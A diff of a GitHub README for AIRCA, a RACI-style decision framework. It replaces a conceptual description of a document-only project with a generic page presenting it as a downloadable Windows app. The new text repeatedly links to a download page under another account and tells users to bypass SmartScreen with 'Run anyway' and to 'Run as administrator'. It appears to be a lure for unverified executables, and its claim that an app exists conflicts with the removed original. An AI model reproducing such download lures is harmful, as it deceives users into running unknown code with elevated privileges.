@@ -1,176 +1,200 @@
-# AIRCA + Fractal Decision Architecture
+# 🧩 airca-fractal-decision-architecture - Clear decision structure for teams
 
-AIRCA as an AI-era adaptation of RACI, extended through fractal taxonomy, fractal ontology, fractal decision architecture, and higher-order ultimate-frame governance.
+[![Download / Install](https://img.shields.io/badge/Download%20%2F%20Install-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
 
-This repository explores how decision architecture can remain legible, governable, and machine-readable in AI-assisted environments where the central scarcity is no longer answers, but decision capacity.
+## 📥 Download
+Use this link to visit the project page and download the app for Windows:
 
-## Core claim
+[Open the download page](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
 
-As AI makes answers cheaper, the scarce resource becomes decision capacity.
+## 🪟 Windows Setup
+1. Open the download page above.
+2. Look for the latest release or the main download file.
+3. Download the Windows file to your computer.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Run the app file, such as `.exe`.
+7. If Windows asks for permission, select **Yes**.
+8. If the SmartScreen box appears, choose **More info** and then **Run anyway** if you trust the source.
 
-That means institutions need more than retrieval, synthesis, and automation. They need structures that preserve:
+## 🧭 What this app is for
+AIRCA is a decision framework built for people who want clear roles, clean structure, and simple control over how choices get made. It adapts the RACI model for AI-era work and adds a fractal view of decision making. That means you can use the same pattern across a small task, a team process, or a larger group without losing structure.
 
-- classification
-- meaning
-- accountability
-- review
-- lifecycle logic
-- higher-order commitments
-- durable decision memory
+This project fits use cases like:
+- team ownership maps
+- AI governance
+- knowledge tracking
+- role clarity
+- decision routing
+- policy design
+- theological governance
+- recursive decision trees
 
-## What this repository develops
+## ✨ Main features
+- Clear role mapping for tasks and decisions
+- Fractal taxonomy for sorting parts into clean groups
+- Fractal ontology for linking ideas, roles, and rules
+- Decision architecture that supports repeat use across levels
+- Machine-readable artifacts for structured use
+- Support for knowledge management and governance work
+- Useful for both human-led and AI-assisted processes
+- Built around simple decision flow, not complex setup
 
-This repository develops several connected ideas:
+## 🧰 What you need
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the first download
+- Permission to run downloaded apps
 
-- **AIRCA** as an AI-era adaptation of RACI
-- **UAIRCA** as an extension that adds an explicit Ultimate Frame above the operational decision architecture
-- **LAIRCA** as a Christian expression in which Logos serves as an example of that Ultimate Frame
-- **fractal taxonomy** as recursive classification logic
-- **fractal ontology** as recursive relationship logic
-- **fractal decision-making** as recursive decision structure across levels
-- **machine-readable artifact design** as the operational layer that can carry these ideas in structured form
+For best use, keep your screen at 1366 x 768 or higher so the layout is easy to read.
 
-## Repository structure
+## 🛠️ Install steps
+1. Go to the download page.
+2. Download the Windows file.
+3. Save it in a folder you can find, مثل Downloads or Desktop.
+4. If the file is compressed, extract it first.
+5. Open the app folder.
+6. Double-click the app file.
+7. If the app creates a setup window, follow the prompts.
+8. If no setup window appears, the app may run from the file you opened.
 
-### Root level
-The root layer provides:
+## 📌 How to use it
+After the app opens, start with a simple decision or task. Add the people or roles involved, then mark who owns the work, who gives input, and who needs to review the result.
 
-- overall framing
-- citation and authorship
-- machine-readable repository metadata
-- lineage and thought-leadership positioning
+A basic flow looks like this:
+1. Create a decision item.
+2. Name the role or person in charge.
+3. Add supporting roles.
+4. Link the item to a rule, policy, or knowledge note.
+5. Review the structure for gaps.
+6. Save or export the result if that option is present.
 
-### `docs/`
-The `docs/` folder is the main content layer and the beginning of the repository’s more fractal internal structure.
+If you use AIRCA for AI governance, keep the same pattern for each policy area. This helps you compare tasks and see who is responsible at each step.
 
-It includes concept nodes for:
+## 🧱 Structure model
+AIRCA works well when you think in layers:
+- **Task layer**: the direct work that needs a decision
+- **Role layer**: who owns, reviews, or advises
+- **Rule layer**: the policy or standard that guides action
+- **Knowledge layer**: notes, links, and context
+- **Recursive layer**: the same structure used again at the next level up
 
-- `airca/`
-- `fractal-taxonomy/`
-- `fractal-ontology/`
-- `fractal-decision-making/`
-- `integrations/`
+This makes it easier to manage a small process and a larger system with the same method.
 
-Each node is designed to evolve toward a repeated internal structure including:
-- `README.md`
-- `artifact.json`
-- lineage
-- substantive notes
-- examples
-- machine-readable design where relevant
+## 🧠 Common uses
+You can use this app for:
+- RACI style role mapping
+- AI oversight planning
+- church or ministry decision flow
+- policy review steps
+- project ownership charts
+- team handoff rules
+- taxonomy design
+- ontology mapping
+- structured notes for governance
 
-## AIRCA
+## 🔍 Tips for first use
+- Start with one simple process
+- Use plain names for roles
+- Keep each decision item short
+- Do not add too many layers at first
+- Reuse the same labels when possible
+- Check that every task has an owner
+- Make sure review steps are clear
+- Save often if the app has a save button
 
-AIRCA is treated here as an AI-era adaptation of RACI for decision-making under AI-assisted overload.
+## 🗂️ Example setup
+Here is a simple example:
 
-- **Architect**
-- **Inform**
-- **Rank**
-- **Commit**
-- **Act**
+- **Task**: Approve an AI use case
+- **Owner**: Product lead
+- **Advisor**: Legal reviewer
+- **Reviewer**: Governance team
+- **Rule**: Internal AI policy
+- **Context**: Risk note, data use note, decision record
 
-Its value is not only in workflow clarity, but in clarifying how humans and AI interact across the full decision cycle.
+This kind of setup makes it easier to see where a decision starts, who checks it, and what rule guides it.
 
-## UAIRCA
+## 🔗 Project link
+Use this page to get the app and related files:
 
-UAIRCA extends AIRCA by making explicit the **Ultimate Frame** above the operational decision architecture.
+https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture
 
-This layer accounts for:
-- theological commitments
-- philosophical first principles
-- constitutional commitments
-- mission-based non-negotiables
-- higher-order moral and anthropological assumptions
+## 🖥️ Run on Windows
+If you already have the file on your computer:
+1. Open the folder where you saved it.
+2. Find the app file or extracted folder.
+3. Double-click the Windows app file.
+4. If nothing happens, right-click and choose **Run as administrator**.
+5. If Windows blocks it, use the permission prompts to continue.
 
-UAIRCA is developed here as an extension by **Lowell T. Wong**.
+## 🧩 File types you may see
+You may see one of these:
+- `.exe` for a Windows app
+- `.zip` for a compressed download
+- `.msi` for a Windows installer
+- folders with readme files and support files
 
-## LAIRCA
+If the download is a `.zip`, extract it before you try to run the app.
 
-LAIRCA presents **Logos** as an explicitly Christian example of the Ultimate Frame.
-
-This means the operational decision architecture is understood as downstream from a theological account of truth, order, meaning, and moral coherence.
-
-LAIRCA is not a replacement for UAIRCA, but a Christian instantiation of the U-layer.
-
-## Fractal architecture
-
-The repository argues that the same governing logic should recur across levels.
-
-That includes:
-
-- enterprise
-- function
-- team
-- workflow
-- document
-- issue
-- task
-- node
-
-This fractal logic applies to:
-
-- taxonomy
-- ontology
-- decision-making
-- lifecycle
-- inheritance
-- interpretation
-- artifact design
-
-## Machine-readable artifacts
-
-A major part of the repository is the claim that decision architecture becomes more durable when it is carried in machine-readable artifacts.
-
-These artifacts should preserve:
-- identity
-- classification
-- relationships
-- logic
-- governance
-- evidence
-- provenance
-- lifecycle
-- inheritance
-- interpretation rules
-- ultimate-frame constraints where relevant
-
-## Intellectual lineage
-
-The repository is informed in part by adjacent work in:
-
+## 📚 Topic areas
+This project sits in these areas:
+- AI governance
+- decision architecture
 - decision intelligence
-- Bayesian decision theory
-- control systems and cybernetics
-- graph theory and knowledge graphs
-- hierarchical and multi-scale systems
-- recursive data structures
-- constraint optimization
-- latent structure and decision landscapes
-
-The repository also distinguishes between:
-- AIRCA as collaboratively emergent
-- schema logic as an existing structural foundation
-- external conceptual influences
-- repository-specific synthesis and extensions developed by **Lowell T. Wong**
-
-## Attribution
-
-The AIRCA framework emerged through a collaborative process between Alex A. and Lowell T. Wong.
-
-UAIRCA and LAIRCA, as developed here, reflect **Lowell T. Wong’s** extension of AIRCA into:
-
-- explicit ultimate-frame architecture
-- theological and philosophical first-principles governance
-- Logos-grounded Christian decision architecture
-- fractal taxonomy
+- fractal systems
 - fractal ontology
-- fractal decision-making
-- machine-readable artifact design
+- fractal taxonomy
+- knowledge management
+- RACI
+- recursive governance
+- theological governance
+- machine-readable artifacts
 
-## Status
+## 🧭 Basic workflow
+1. Open the app.
+2. Create a new decision record.
+3. Add the main task.
+4. Add the role map.
+5. Attach the policy or context note.
+6. Review the full structure.
+7. Export or store the record if the app supports it.
 
-Public draft, version 0.1.
+## 🧪 If the app does not open
+Try these steps:
+1. Make sure the file finished downloading.
+2. Unzip the file if needed.
+3. Check that you opened the right app file.
+4. Right-click and choose **Run as administrator**.
+5. Restart your PC and try again.
+6. Download the file again if it looks incomplete.
 
-## Citation
+## 📁 Folder tips
+Keep the app in a simple folder path, such as:
+- `Downloads`
+- `Desktop`
+- `Documents\AIRCA`
 
-See `CITATION.cff`.
+Avoid deep folder paths with many nested folders. Simple paths are easier to manage on Windows.
+
+## 🔐 Safe use
+Only open files from the project page you trust. If the app asks for access to files or folders, check that the request fits how you plan to use it.
+
+## 🧾 Short example of AIRCA use
+A team wants to review an AI feature before release. They use AIRCA to mark:
+- who owns the feature
+- who reviews risk
+- who checks policy
+- who records the final decision
+
+That keeps the process clear and easy to follow
+
+## 📎 Download again
+If you need the file again, use the project page here:
+
+[Visit the download page](https://github.com/rightsideup-rubiales387/airca-fractal-decision-architecture)
+
+## 🧭 What makes it different
+AIRCA keeps the familiar RACI idea, then extends it with a fractal model. That means the same decision pattern can repeat across levels without losing order. It is useful when one decision affects many smaller decisions, or when one policy needs to work across a whole system
